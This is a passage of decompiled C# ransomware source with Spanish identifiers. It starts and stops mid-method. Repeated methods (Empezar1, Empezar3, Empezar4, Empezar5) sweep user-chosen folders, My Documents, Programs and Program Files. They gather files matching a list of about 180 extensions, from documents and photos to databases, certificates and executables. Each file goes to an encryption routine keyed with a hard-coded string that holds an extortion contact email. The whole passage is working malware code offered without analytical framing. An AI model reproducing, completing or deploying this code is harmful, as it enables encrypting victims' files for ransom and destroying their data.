				".xls", ".xlsx", ".zip", ".rar", ".config", ".lid", ".wri", ".", ".", ".dll",
				".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep",
				".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx",
				".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw",
				".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx",
				".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla",
				".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java",
				".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef",
				".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef",
				".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b",
				".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot",
				".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx",
				".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar",
				".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2",
				".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma",
				".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls",
				".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip"
			};
			foreach (string item7 in BusarArchivos(text4, mExtesiones7))
			{
				RutinaDeCifrado(item7, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(text5);
			IEnumerable<string> mExtesiones8 = new string[180]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".lid", ".wri", ".", ".", ".dll",
				".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep",
				".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx",
				".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw",
				".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx",
				".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla",
				".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java",
				".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef",
				".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef",
				".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b",
				".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot",
				".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx",
				".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar",
				".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2",
				".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma",
				".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls",
				".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip"
			};
			foreach (string item8 in BusarArchivos(text5, mExtesiones8))
			{
				RutinaDeCifrado(item8, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(text6);
			IEnumerable<string> mExtesiones9 = new string[180]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".lid", ".wri", ".", ".", ".dll",
				".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep",
				".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx",
				".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw",
				".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx",
				".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla",
				".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java",
				".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef",
				".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef",
				".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b",
				".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot",
				".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx",
				".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar",
				".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2",
				".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma",
				".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls",
				".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip"
			};
			foreach (string item9 in BusarArchivos(text6, mExtesiones9))
			{
				RutinaDeCifrado(item9, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(text7);
			IEnumerable<string> mExtesiones10 = new string[180]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".lid", ".wri", ".", ".", ".dll",
				".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep",
				".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx",
				".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw",
				".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx",
				".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla",
				".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java",
				".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef",
				".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef",
				".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b",
				".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot",
				".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx",
				".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar",
				".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2",
				".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma",
				".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls",
				".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip"
			};
			foreach (string item10 in BusarArchivos(text7, mExtesiones10))
			{
				RutinaDeCifrado(item10, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(text8);
			IEnumerable<string> mExtesiones11 = new string[180]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".lid", ".wri", ".", ".", ".dll",
				".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep",
				".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx",
				".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw",
				".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx",
				".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla",
				".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java",
				".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef",
				".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef",
				".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b",
				".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot",
				".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx",
				".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar",
				".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2",
				".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma",
				".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls",
				".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip"
			};
			foreach (string item11 in BusarArchivos(text8, mExtesiones11))
			{
				RutinaDeCifrado(item11, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError11)
		{
			ProjectData.SetProjectError(projectError11);
			ProjectData.ClearProjectError();
		}
	}

	private void Empezar1()
	{
		string text = TextBox4.get_Text();
		string text2 = TextBox8.get_Text();
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(text);
			IEnumerable<string> mExtesiones = new string[180]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".lid", ".wri", ".", ".", ".dll",
				".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep",
				".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx",
				".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw",
				".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx",
				".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla",
				".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java",
				".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef",
				".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef",
				".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b",
				".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot",
				".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx",
				".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar",
				".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2",
				".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma",
				".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls",
				".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip"
			};
			foreach (string item in BusarArchivos(text, mExtesiones))
			{
				RutinaDeCifrado(item, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(text2);
			IEnumerable<string> mExtesiones2 = new string[180]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".lid", ".wri", ".", ".", ".dll",
				".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep",
				".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx",
				".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw",
				".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx",
				".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla",
				".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java",
				".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef",
				".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef",
				".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b",
				".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot",
				".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx",
				".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar",
				".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2",
				".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma",
				".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls",
				".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip"
			};
			foreach (string item2 in BusarArchivos(text2, mExtesiones2))
			{
				RutinaDeCifrado(item2, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Empezar3()
	{
		string myDocuments = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments();
		string programs = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Programs();
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(myDocuments);
			IEnumerable<string> mExtesiones = new string[181]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".ins", ".lid", ".wri", ".", ".",
				".dll", ".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb",
				".aep", ".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp",
				".asx", ".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt",
				".crw", ".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm",
				".docx", ".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf",
				".fla", ".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar",
				".java", ".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf",
				".mef", ".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg",
				".nef", ".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12",
				".p7b", ".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd",
				".pot", ".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm",
				".pptx", ".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf",
				".rar", ".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql",
				".sr2", ".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2",
				".wma", ".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm",
				".xls", ".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx",
				".zip"
			};
			foreach (string item in BusarArchivos(myDocuments, mExtesiones))
			{
				RutinaDeCifrado(item, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(programs);
			IEnumerable<string> mExtesiones2 = new string[181]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".ins", ".lid", ".wri", ".", ".",
				".dll", ".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb",
				".aep", ".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp",
				".asx", ".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt",
				".crw", ".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm",
				".docx", ".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf",
				".fla", ".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar",
				".java", ".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf",
				".mef", ".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg",
				".nef", ".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12",
				".p7b", ".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd",
				".pot", ".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm",
				".pptx", ".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf",
				".rar", ".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql",
				".sr2", ".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2",
				".wma", ".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm",
				".xls", ".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx",
				".zip"
			};
			foreach (string item2 in BusarArchivos(programs, mExtesiones2))
			{
				RutinaDeCifrado(item2, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Empezar4()
	{
		string text = TextBox7.get_Text();
		string text2 = TextBox8.get_Text();
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(text);
			IEnumerable<string> mExtesiones = new string[181]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".ins", ".lid", ".wri", ".", ".",
				".dll", ".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb",
				".aep", ".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp",
				".asx", ".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt",
				".crw", ".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm",
				".docx", ".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf",
				".fla", ".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar",
				".java", ".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf",
				".mef", ".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg",
				".nef", ".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12",
				".p7b", ".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd",
				".pot", ".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm",
				".pptx", ".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf",
				".rar", ".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql",
				".sr2", ".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2",
				".wma", ".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm",
				".xls", ".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx",
				".zip"
			};
			foreach (string item in BusarArchivos(text, mExtesiones))
			{
				RutinaDeCifrado(item, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(text2);
			IEnumerable<string> mExtesiones2 = new string[181]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".ins", ".lid", ".wri", ".", ".",
				".dll", ".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb",
				".aep", ".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp",
				".asx", ".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt",
				".crw", ".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm",
				".docx", ".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf",
				".fla", ".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar",
				".java", ".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf",
				".mef", ".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg",
				".nef", ".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12",
				".p7b", ".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd",
				".pot", ".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm",
				".pptx", ".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf",
				".rar", ".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql",
				".sr2", ".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2",
				".wma", ".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm",
				".xls", ".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx",
				".zip"
			};
			foreach (string item2 in BusarArchivos(text2, mExtesiones2))
			{
				RutinaDeCifrado(item2, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Empezar5()
	{
		string programFiles = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
		string text = TextBox9.get_Text();
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(programFiles);
			IEnumerable<string> mExtesiones = new string[179]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".ins", ".lid", ".wri", ".", ".",
				".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep", ".aepx",
				".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx", ".avi",
				".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw", ".cs",
				".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx", ".dot",
				".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla", ".flv",
				".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java", ".jpeg",
				".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef", ".mid",
				".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef", ".nrw",
				".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b", ".p7c",
				".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot", ".potm",
				".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx", ".prel",
				".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar", ".raw",
				".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2", ".srf",
				".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma", ".wmv",
				".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls", ".xlsb",
				".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip"
			};
			foreach (string item in BusarArchivos(programFiles, mExtesiones))
			{
				RutinaDeCifrado(item, "rodiansergei.socialad@prtotonmail.com@rodiansergei");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(text);
			IEnumerable<string> mExtesiones2 = new string[181]
			{
				".png", ".exe", ".jpeg", ".Jpg", "mp3", ".txt", ".ins", ".dll", ".doc", ".docx",
				".xls", ".xlsx", ".zip", ".rar", ".config", ".ins", ".lid", ".wri", ".", ".",
				".dll", ".exe", ".zip", ".rar", ".", ".3dm", ".3g2", ".3gp", ".aaf", ".accdb",
				".aep", ".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp",
				".asx", ".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt",
				".crw", ".cs", ".csv", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm",
